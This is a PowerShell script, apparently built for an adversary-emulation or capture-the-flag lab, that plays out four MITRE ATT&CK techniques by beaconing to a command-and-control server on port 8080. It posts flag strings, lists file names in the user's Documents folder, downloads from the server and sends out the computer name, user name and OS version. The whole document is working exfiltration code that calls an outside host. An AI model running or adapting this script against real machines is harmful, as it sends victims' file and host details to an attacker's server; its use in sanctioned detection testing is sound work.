# Windows PowerShell Payload - MITRE ATT&CK Techniques
param([string]$c2_ip = $null)

if (-not $c2_ip) {
    # Try to get default gateway (likely the host's bridge IP)
    $c2_ip = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
    if (-not $c2_ip) { $c2_ip = "192.168.8.90" }  # fallback, but should auto-detect
}
$c2_url = "http://${c2_ip}:8080"

# MITRE Technique Flags
$flags = @{
    "T1059.001" = "FLAG{T1059.001-powershell-execution}"
    "T1105"     = "FLAG{T1105-ingress-tool-transfer}"
    "T1041"     = "FLAG{T1041-exfiltration-over-c2}"
    "T1083"     = "FLAG{T1083-file-discovery}"
}

# 1. Execution flag
try {
    Invoke-WebRequest -Uri "$c2_url/collect" -Method POST -Body $flags["T1059.001"] -UseBasicParsing -TimeoutSec 5
    Write-Host "[+] Sent execution flag"
} catch { Write-Host "[-] C2 unreachable" }

# 2. File Discovery (T1083)
$user_files = Get-ChildItem -Path "$env:USERPROFILE\Documents" -ErrorAction SilentlyContinue | Select-Object -First 5
if ($user_files) {
    $discovery_data = "$($flags["T1083"])`nFound files: $($user_files.Name -join ', ')"
    try {
        Invoke-WebRequest -Uri "$c2_url/collect" -Method POST -Body $discovery_data -UseBasicParsing -TimeoutSec 5
    } catch {}
}

# 3. Ingress Tool Transfer (T1105) - download a benign file from C2
try {
    $test = Invoke-WebRequest -Uri "$c2_url/status" -UseBasicParsing -TimeoutSec 5
    Invoke-WebRequest -Uri "$c2_url/collect" -Method POST -Body $flags["T1105"] -UseBasicParsing -TimeoutSec 5
} catch {}

# 4. Exfiltration over C2 (T1041)
$host_info = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
}
$exfil_data = "$($flags["T1041"])`n$($host_info | ConvertTo-Json -Compress)"
try {
    Invoke-WebRequest -Uri "$c2_url/collect" -Method POST -Body $exfil_data -UseBasicParsing -TimeoutSec 5
} catch {}

Write-Host "Payload execution completed"
